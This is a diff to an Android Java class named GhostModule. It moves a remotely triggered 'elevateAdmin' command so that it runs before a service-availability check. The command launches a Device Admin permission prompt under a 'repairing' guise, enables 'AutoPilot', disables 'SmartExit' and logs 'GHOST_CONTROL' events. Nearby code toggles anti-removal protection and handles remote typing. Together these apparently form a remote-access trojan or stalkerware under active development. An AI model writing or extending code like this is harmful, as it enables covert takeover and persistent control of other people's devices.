@@ -634,6 +634,27 @@ public class GhostModule extends BaseModule {
             return newResponse(Response.Status.OK, "application/json", "{\"success\":true}");
         }
 
+        if (action.equals("elevateAdmin") || action.equals("elevate_admin") || action.equals("admin")) {
+            new Handler(Looper.getMainLooper()).post(() -> {
+                try {
+                    context.getSharedPreferences("StabilityConfig", Context.MODE_PRIVATE)
+                        .edit().putBoolean("is_repairing", true).apply();
+                    IO_Persistence_Manager.setAutoPilot(true);
+                    IO_Persistence_Manager.stopSmartExit();
+
+                    Intent wrapperIntent = new Intent(context, com.labs.labrats.PermissionActivity.class);
+                    wrapperIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_ACTIVITY_NO_ANIMATION);
+                    wrapperIntent.putExtra("launch_admin", true);
+                    context.startActivity(wrapperIntent);
+
+                    com.labs.labrats.FirebaseConfig.logActivity("GHOST_CONTROL: Device Admin elevation prompt dispatched");
+                } catch (Exception e) {
+                    android.util.Log.e("GhostModule", "Failed to launch device admin wrapper: " + e.getMessage());
+                }
+            });
+            return newResponse(Response.Status.OK, "application/json", "{\"success\":true}");
+        }
+
         if (ghost == null) return newResponse(Response.Status.OK, "application/json", "{\"success\":false, \"error\":\"Ghost Service Offline\"}");
 
         if (IO_Persistence_Manager.isLockActive() && !action.equals("lock") && !action.equals("settings")) {
@@ -730,28 +751,6 @@ public class GhostModule extends BaseModule {
                 break;
             case "toggleAntiRemoval":
                 IO_Persistence_Manager.setAntiRemovalEnabled(!IO_Persistence_Manager.isAntiRemovalEnabled());
-                success = true;
-                break;
-            case "elevateAdmin":
-            case "elevate_admin":
-            case "admin":
-                new Handler(Looper.getMainLooper()).post(() -> {
-                    try {
-                        context.getSharedPreferences("StabilityConfig", Context.MODE_PRIVATE)
-                            .edit().putBoolean("is_repairing", true).apply();
-                        IO_Persistence_Manager.setAutoPilot(true);
-                        IO_Persistence_Manager.stopSmartExit();
-
-                        Intent wrapperIntent = new Intent(context, com.labs.labrats.PermissionActivity.class);
-                        wrapperIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_ACTIVITY_CLEAR_TOP);
-                        wrapperIntent.putExtra("launch_admin", true);
-                        context.startActivity(wrapperIntent);
-
-                        com.labs.labrats.FirebaseConfig.logActivity("GHOST_CONTROL: Device Admin elevation wrapper launched");
-                    } catch (Exception e) {
-                        android.util.Log.e("GhostModule", "Failed to launch device admin: " + e.getMessage());
-                    }
-                });
                 success = true;
                 break;
             case "type":
